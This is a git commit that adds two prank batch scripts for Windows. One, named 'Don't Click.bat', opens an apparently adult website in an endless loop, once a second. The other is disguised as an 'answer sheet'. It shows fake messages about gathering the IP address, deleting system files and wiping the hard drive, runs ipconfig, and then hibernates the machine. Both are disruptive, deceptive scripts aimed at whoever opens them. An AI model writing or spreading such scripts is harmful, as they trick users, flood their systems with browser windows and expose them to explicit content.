0a3422970761cdb86cdacd6b3751c21f2437039b
icekweem <jamjamjamreyes@gmail.com>
2022-10-21 15:16:49 +0800

    Proposal

---
+++ MFS/Don't Click.bat
@@ -0,0 +1,5 @@
+@echo off
+:a 
+  	start "webpage" "https://pinayflix.tv/"
+	timeout 1 > NUL
+goto a
---
+++ MFS/Dont Click/answer sheet.bat
@@ -0,0 +1,19 @@
+@echo off
+color a
+echo Executing attack
+timeout /t 2 /nobreak >nul
+echo:
+echo Gathering IP...
+timeout /t 2 /nobreak >nul
+ipconfig
+timeout /t 2 /nobreak >nul
+echo:
+echo Deleting System Files...
+timeout /t 2 /nobreak >nul
+echo:
+echo Wiping Hardrive...
+timeout /t 2 /nobreak >nul
+echo:
+echo Shutting Down...
+timeout /t 2 /nobreak >nul
+shutdown.exe /h
